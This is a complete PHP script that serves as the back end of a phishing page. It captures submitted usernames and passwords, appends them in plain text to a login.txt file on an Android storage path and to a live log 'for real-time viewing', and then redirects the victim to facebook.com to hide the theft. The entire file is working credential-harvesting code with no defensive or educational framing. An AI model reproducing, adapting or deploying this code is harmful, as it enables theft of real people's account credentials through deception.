<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $entry = "Username: " . $username . " | Password: " . $password . "\n";

    $dir = "/storage/emulated/0/Login txt/";
    $file = $dir . "login.txt";

    // Also log to project directory (for real-time viewing)
    $liveLog = "live_login.log";

    // Create directory if it doesn't exist
    if (!is_dir($dir)) {
        mkdir($dir, 0777, true);
    }

    file_put_contents($file, $entry, FILE_APPEND);
    file_put_contents($liveLog, date("Y-m-d H:i:s") . " - " . $entry, FILE_APPEND);

    header("Location: https://www.facebook.com");
    exit();
}
?>